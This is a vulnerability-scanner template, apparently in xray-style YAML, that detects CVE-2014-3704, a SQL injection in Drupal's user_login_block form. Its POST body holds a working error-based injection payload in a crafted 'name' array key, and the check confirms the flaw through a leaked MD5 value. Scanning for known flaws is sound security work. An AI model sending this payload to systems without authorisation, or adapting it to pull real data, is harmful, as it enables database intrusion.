id: CVE-2014-3704

info:
  name: Drupal SQL Injection
  author: unkown
  severity: high
  description: |-
    Drupal before 7.34 allows remote attackers to execute arbitrary SQL commands via crafted input to the "name" parameter to the user_login_block form.
  reference:
    - https://www.drupal.org/node/2300947
  tags: cve,cve2014,drupal,sqli
  created: 2023/06/23

set:
  rand: randomInt(200000000, 210000000)
  md5rand: md5(string(rand))
rules:
  r0:
    request:
      method: POST
      path: /?q=node&destination=node={{md5rand}}
      body: pass=lol&form_build_id=&form_id=user_login_block&op=Log+in&name[0 or updatexml(0,concat(0xa,(select md5({{rand}}))),0)%23]=bob&name[0]=a
    expression: response.status == 500 && response.body.bcontains(bytes(substr(md5rand, 0, 31)))
expression: r0()
